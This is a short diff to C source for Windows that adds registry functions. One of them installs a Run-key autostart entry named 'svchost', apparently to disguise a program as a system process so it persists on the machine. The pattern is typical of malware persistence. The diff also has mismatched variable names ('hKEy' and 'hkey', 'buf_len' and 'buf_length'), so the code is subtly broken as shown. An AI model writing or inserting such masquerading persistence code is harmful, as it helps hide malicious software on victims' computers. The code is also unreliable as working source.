@@ -183,8 +183,32 @@ int key_checker(void)
 	if(r_key != 0)
 	{
 		check = 1;
-		return check;
+		return(check);
 	}
 	
-	r_key = RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);	
+	r_key = RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);
+	
+	if((r_key != 0) || (buf_len>BUFSIZE))
+		check = 2;
+   	if(r_key == 0)
+		check = 0;
+	RegCloseKey(hKey);
+	return(check);	
+}
+
+int create_key(char *path)
+{
+	int r_key;
+	int check;
+	HKEY hKEy;
+	r_key = RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
+	if(r_key == 0)
+	{
+		RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));
+		check = 0;
+		return(check);
+	}
+	if(r_key != 0)
+		check = 1;
+	return(check);
 }
